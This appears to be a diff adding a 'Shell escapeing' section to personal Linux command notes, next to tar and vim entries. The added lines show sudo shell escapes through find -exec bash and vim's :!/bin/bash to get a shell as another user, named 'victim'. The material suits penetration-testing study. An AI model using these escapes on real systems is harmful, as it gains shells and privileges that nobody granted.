@@ -257,6 +257,16 @@ tar -xvf <NAME_OF_CONTENTS>                         # (extract , verbose , file 
 tar -tvf <NAME_OF_CONTENTS> <NAME_TO_BACKUP_TO>     # (inspect contents only, verbose , file)
 tar -tzvf <NAME_OF_CONTENTS> <NAME_TO_BACKUP_TO>    # This will compress the archive down with gzip. FYI - There is marginal saving between the two compression types.
 ```
+
+## Shell escapeing 
+```
+sudo -u victim find /etc -name passwd -exec bash \;		# use find to look for an obvious result and then execute bash
+
+sudo -u victim vim 						# 1st - Open vim as the the privledged user
+:!/bin/bash							# 2nd - In the vim terminal type the command to get a shell open as the user
+```
+
+
 # Text editing on Linux
 
 ## VI(m) - 
